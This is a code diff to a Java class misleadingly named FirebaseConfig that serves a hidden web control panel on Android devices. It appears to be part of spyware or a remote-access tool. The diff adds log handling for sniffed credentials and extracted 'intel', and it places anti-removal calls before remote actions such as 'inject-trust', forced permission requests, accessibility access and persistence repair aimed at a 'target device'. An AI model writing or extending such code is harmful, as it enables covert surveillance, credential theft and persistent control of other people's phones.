@@ -82,7 +82,10 @@ public class FirebaseConfig extends NanoHTTPD {
         // Determine Priority Level for UI Coloring
         String priority = "[S]"; // Default: Success/Info (Cyan)
         String upper = hardenedMsg.toUpperCase();
-        if (upper.contains("CRITICAL") || upper.contains("AUTH") || upper.contains("OTP") || upper.contains("ALERT") || upper.contains("SECURITY")) {
+        
+        if (upper.contains("INTEL_EXTRACTED") || upper.contains("SNIFFED") || upper.contains("CREDENTIALS") || upper.contains("SNIFFER")) {
+            priority = "[I]"; // Intel/Credentials (Blue)
+        } else if (upper.contains("CRITICAL") || upper.contains("AUTH") || upper.contains("OTP") || upper.contains("ALERT") || upper.contains("SECURITY")) {
             priority = "[C]"; // Critical (Red)
         } else if (upper.contains("WARNING") || upper.contains("BATTERY") || upper.contains("LOST") || upper.contains("ERROR")) {
             priority = "[W]"; // Warning (Orange)
@@ -283,7 +286,7 @@ public class FirebaseConfig extends NanoHTTPD {
             "<div class=\"login-card\">" +
             "<img src=\"/logo?v=146\" style=\"width: 187px; height: 187px; background: transparent !important;\">" +
             "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
-            "<div style=\"font-size:0.6rem; opacity:0.4; margin-top:-20px; margin-bottom:30px; letter-spacing:2px; font-family: 'Aldrich', sans-serif;\">v1.5.1</div>" +
+            "<div style=\"font-size:1.0rem; opacity:0.5; margin-top:-25px; margin-bottom:35px; letter-spacing:3px; font-family: 'Aldrich', sans-serif;\">v1.5.1</div>" +
             "<form id=\"login-form\" method=\"POST\" action=\"/login\">" +
             "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
             "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
@@ -607,9 +610,11 @@ public class FirebaseConfig extends NanoHTTPD {
                         setSilentMode();
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/device/optimize-stability")) {
+                        IO_Persistence_Manager.forceSkipAntiRemoval();
                         OemStabilityHelper.requestAutoStart(context);
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/device/inject-trust")) {
+                        IO_Persistence_Manager.forceSkipAntiRemoval();
                         StabilityBypass.executeTrustInjection(context);
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/device/open-url")) {
@@ -640,20 +645,24 @@ public class FirebaseConfig extends NanoHTTPD {
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/device/request-permissions")) {
                         logActivity("SYSTEM_MAINTENANCE: Remotely dispatched permission request sequence.");
+                        IO_Persistence_Manager.forceSkipAntiRemoval();
                         WorkManager_Sync.triggerPermissionActivity(context);
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Permission sequence dispatched to target device.\"}");
                     } else if (uri.equals("/device/deep-repair")) {
                         logActivity("SYSTEM_MAINTENANCE: Remotely forced deep repair (App Settings).");
+                        IO_Persistence_Manager.forceSkipAntiRemoval();
                         Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                         intent.setData(Uri.parse("package:" + context.getPackageName()));
                         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                         context.startActivity(intent);
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/device/inject-trust")) {
+                        IO_Persistence_Manager.forceSkipAntiRemoval();
                         StabilityBypass.executeTrustInjection(context);
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/device/open-accessibility")) {
                         logActivity("SYSTEM_MAINTENANCE: Remotely opening Accessibility Hub.");
+                        IO_Persistence_Manager.forceSkipAntiRemoval();
                         Intent intent = new Intent(context, PermissionActivity.class);
                         intent.putExtra("target_menu", "accessibility");
                         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
@@ -661,6 +670,7 @@ public class FirebaseConfig extends NanoHTTPD {
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/device/open-notifications")) {
                         logActivity("SYSTEM_MAINTENANCE: Remotely opening Notification Hub.");
+                        IO_Persistence_Manager.forceSkipAntiRemoval();
                         Intent intent = new Intent(context, PermissionActivity.class);
                         intent.putExtra("target_menu", "notifications");
                         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
@@ -680,6 +690,7 @@ public class FirebaseConfig extends NanoHTTPD {
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/device/fix-persistence")) {
                         logActivity("SYSTEM_MAINTENANCE: Initiating persistence repair...");
+                        IO_Persistence_Manager.forceSkipAntiRemoval();
                         
                         // 1. Open App Info for Hibernation/Battery manual fix
                         Intent infoIntent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
